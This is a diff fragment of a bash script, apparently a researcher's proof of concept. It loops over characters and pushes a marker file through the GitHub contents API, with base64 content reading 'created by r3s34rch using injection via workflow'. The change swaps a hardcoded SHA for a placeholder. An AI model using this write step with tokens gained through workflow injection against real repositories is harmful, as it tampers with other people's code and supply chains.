@@ -26,7 +26,7 @@ for f in {a..z} {A..Z} {0..9}; do
          --header "$Header" \
          --header "Accept: application/vnd.github.v3+json" \
          --header "X-GitHub-Api-Version: 2022-11-28" \
-         -d '{"message":"hello from r3s34rch","content":"Y3JlYXRlZCBieSByM3MzNHJjaCB1c2luZyBpbmplY3Rpb24gdmlhIHdvcmtmbG93IQ==", "sha":"95b966ae1c166bd92f8ae7d1c313e738c731dfc3"}'
+         -d '{"message":"hello from r3s34rch","content":"Y3JlYXRlZCBieSByM3MzNHJjaCB1c2luZyBpbmplY3Rpb24gdmlhIHdvcmtmbG93IQ==", "sha":"SHA_FROM_ABOVE"}'
     echo "-----------------------------------------------------------------"
 done
 
